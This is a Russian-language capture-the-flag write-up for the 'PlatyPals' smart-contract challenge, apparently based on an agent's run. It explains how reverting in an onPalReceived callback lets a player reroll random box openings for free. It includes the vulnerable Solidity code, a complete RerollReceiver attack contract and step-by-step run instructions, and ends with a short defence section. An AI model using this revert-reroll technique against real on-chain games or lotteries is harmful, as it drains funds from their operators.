# PlatyPals: бесплатно перебрасываем боксы через revert

[English](solve.md)

## 0. Цель и идея

`Setup` кладёт 100 ETH в магазин боксов. Победа, когда в магазине останется **меньше 10 ETH**. Один бокс стоит 1 ETH. Легендарного персонажа магазин выкупает за **50 ETH**. Значит достаточно купить два бокса за 2 ETH, гарантированно получить две легендарки и продать их: баланс станет 2 ETH.

Шанс легендарки заявлен 1%. Покупать десятки или сотни боксов не требуется. Решение использовало **откат транзакции из пользовательского callback**. Магазин не засчитывал неудачное открытие, а бэкенд пробовал ещё раз, с новым случайным числом.

## 1. Где ошибка в Chal.sol

В `Chal.openBoxes` выполняется:

```solidity
uint256 id = nextUnopened++;
address owner = boxOwner[id];
uint8 rarity = rolls[i] == 0 ? LEGENDARY :
              rolls[i] < 10 ? EPIC :
              rolls[i] < 40 ? RARE : COMMON;
pals[owner][rarity]++;
emit BoxOpened(id, owner, rarity);

if (owner.code.length > 0) {
    require(
        IPalReceiver(owner).onPalReceived(id, rarity)
            == IPalReceiver.onPalReceived.selector,
        "Pal not accepted"
    );
}
```

Бэкенд передаёт `rolls` в диапазоне 0–99; только `rolls[i]==0` даёт LEGENDARY. После выбора редкости контракт записывает персонажа владельцу, а потом вызывает `onPalReceived` у владельца, если это другой контракт.

Важно: при `revert` в callback откатывается **не только код получателя**, а вся EVM-транзакция. Прирост `nextUnopened`, запись `pals` и `BoxOpened` исчезают. Купленный бокс остаётся закрытым.

## 2. Почему откат даёт новую попытку

Оригинальный `service/box_opener.py`:

```python
unopened = shop.functions.nextBoxId().call() - shop.functions.nextUnopened().call()
if unopened > 0:
    rolls = [secrets.randbelow(100) for _ in range(min(unopened, 16))]
    receipt = send(openBoxes(rolls))
    if receipt.status != 1:
        logging.warning("Opening %s boxes failed, trying again", len(rolls))
```

После неудачного открытия цикл повторяется, и на следующей попытке `secrets.randbelow(100)` выбирает **новое** значение. Поэтому никакого предсказания RNG нет. Мы умеем отклонять неудачный результат, пока не появится единица процентов выигрыша.

Число испытаний распределено геометрически с `p=0.01`, математическое ожидание 100 попыток на легендарку. Но реальный результат может быть и за 10, и за 300+, как в нашем прогоне.

## 3. Что делает собственный контракт-получатель

Агент действительно развернул `RerollReceiver`, скомпилированный `solc 0.8.26`. Ключевое условие из его живого отчёта:

```solidity
function onPalReceived(uint256, uint8 rarity) external returns (bytes4) {
    require(rarity == 3, "reroll");
    return IPalReceiver.onPalReceived.selector;
}
```

Для редкостей 0, 1 или 2 метод возвращает revert, серверная транзакция открытия не меняет состояние. Для LEGENDARY (=3) callback возвращает правильный selector, поэтому открытие завершается.

Ниже минимальная воспроизводимая реализация, восстановленная **по API из исходников**, а не копия несохранившегося контракта:

```solidity
interface IShop {
    function buyBox() external payable returns (uint256);
    function sellLegendary() external;
}
interface IPalReceiver {
    function onPalReceived(uint256 boxId, uint8 rarity) external returns (bytes4);
}

contract RerollReceiver is IPalReceiver {
    IShop public immutable shop;
    address public immutable owner;
    constructor(address shop_) { shop = IShop(shop_); owner = msg.sender; }
    function buy() external payable {
        require(msg.sender == owner);
        require(msg.value == 1 ether);
        shop.buyBox{value: msg.value}();
    }
    function onPalReceived(uint256, uint8 rarity) external returns (bytes4) {
        require(msg.sender == address(shop));
        require(rarity == 3, "reroll");
        return IPalReceiver.onPalReceived.selector;
    }
    function sell() external {
        require(msg.sender == owner);
        shop.sellLegendary();
    }
    receive() external payable {}
}
```

Бокс должен быть куплен **самим этим контрактом**: в `boxOwner[id]` записывается `msg.sender` на момент `buyBox`. Продажа также должна выполняться от владельца, а не напрямую с EOA игрока.

## 4. Почему строго по одному боксу

Бэкенд обрабатывает до 16 боксов за транзакцию (`BATCH_SIZE=16`). Если открыть сразу пачку, и хотя бы один callback сделает revert, вся пачка откатится. Вместе с неудачными редкостями пропадут и хорошие результаты в той же транзакции. Поэтому агент специально покупал **по одному** боксу.

Порядок успешного прогона:

1. Развернуть `RerollReceiver` с адресом `Setup.TARGET()`.
2. Купить первый бокс на 1 ETH. Бэкенд откатывает любые результаты кроме legendary.
3. После легендарки продать её через `sellLegendary` от имени контракта. Магазин платит 50 ETH.
4. Купить второй бокс и повторить.
5. Проверить `Setup.isSolved()`.

## 5. Что зафиксировано в Git-мосте

В настоящем отчёте `task_b67579adc03e4ed9595d66289ae26da5`:

- первая легендарка выпала около **31-го блока** после покупки;
- вторую ждали **около 330 откатов**;
- два раза купили бокс за 1 ETH, два раза продали по 50 ETH;
- баланс стал `100 + 1 - 50 + 1 - 50 = 2 ETH`;
- `isSolved()==true` и флаг принят платформой.

Под нагрузкой из сотен неудачных транзакций RPC иногда разрывал соединение. Помогали повторные подключения. Это было ограничение связи, а не ошибка вероятностного рассуждения.

## 6. Вывод и защита

Надёжный `secrets.randbelow` не помог, потому что **выбор случайного результата можно бесплатно откатить и повторить**. Нужно зафиксировать выигрыш до внешнего callback и не позволять коду получателя менять уже выпавшее значение. Внешнее уведомление не должно быть условием окончательности случайного результата.
